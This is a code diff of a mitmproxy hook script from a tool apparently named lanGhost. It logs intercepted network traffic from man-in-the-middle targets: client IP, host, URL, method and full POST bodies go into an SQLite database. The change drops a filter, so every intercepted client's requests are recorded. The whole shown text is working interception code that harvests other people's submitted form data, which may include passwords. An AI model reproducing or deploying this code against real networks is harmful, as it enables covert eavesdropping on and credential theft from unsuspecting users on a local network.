@@ -19,17 +19,14 @@ DBconn.close()
 def request(flow):
     DBconn = sqlite3.connect(script_path + "lanGhost.db")
     DBcursor = DBconn.cursor()
-    DBcursor.execute("SELECT attackid FROM lanGhost_img WHERE targetip = ?", [str(flow.client_conn.address()[0])])
-    data = DBcursor.fetchall()
-    if data == []:
-        if flow.request.method == "POST":
-            DBcursor.execute("INSERT INTO lanGhost_mitm(source, host, url, method, data, dns) VALUES (?, ?, ?, ?, ?, ?)", (str(flow.client_conn.address()[0]), str(flow.request.host), str(flow.request.pretty_url), str(flow.request.method), str(flow.request.text), "0"))
-            DBconn.commit()
-            print(str(flow.client_conn.address()[0]) + " - " + flow.request.host + " - " + flow.request.pretty_url + " - " + flow.request.method + " - " + str(flow.request.text) + " - " + "0")
-        else:
-            DBcursor.execute("INSERT INTO lanGhost_mitm(source, host, url, method, data, dns) VALUES (?, ?, ?, ?, ?, ?)", (str(flow.client_conn.address()[0]), str(flow.request.host), str(flow.request.pretty_url), str(flow.request.method), "false", "0"))
-            DBconn.commit()
-            print(str(flow.client_conn.address()[0]) + " - " + flow.request.host + " - " + flow.request.pretty_url + " - " + flow.request.method + " - " + "false" + " - " +  "0")
+    if flow.request.method == "POST":
+        DBcursor.execute("INSERT INTO lanGhost_mitm(source, host, url, method, data, dns) VALUES (?, ?, ?, ?, ?, ?)", (str(flow.client_conn.address()[0]), str(flow.request.host), str(flow.request.pretty_url), str(flow.request.method), str(flow.request.text), "0"))
+        DBconn.commit()
+        print(str(flow.client_conn.address()[0]) + " - " + flow.request.host + " - " + flow.request.pretty_url + " - " + flow.request.method + " - " + str(flow.request.text) + " - " + "0")
+    else:
+        DBcursor.execute("INSERT INTO lanGhost_mitm(source, host, url, method, data, dns) VALUES (?, ?, ?, ?, ?, ?)", (str(flow.client_conn.address()[0]), str(flow.request.host), str(flow.request.pretty_url), str(flow.request.method), "false", "0"))
+        DBconn.commit()
+        print(str(flow.client_conn.address()[0]) + " - " + flow.request.host + " - " + flow.request.pretty_url + " - " + flow.request.method + " - " + "false" + " - " +  "0")
     DBconn.close()
 
 def response(flow):
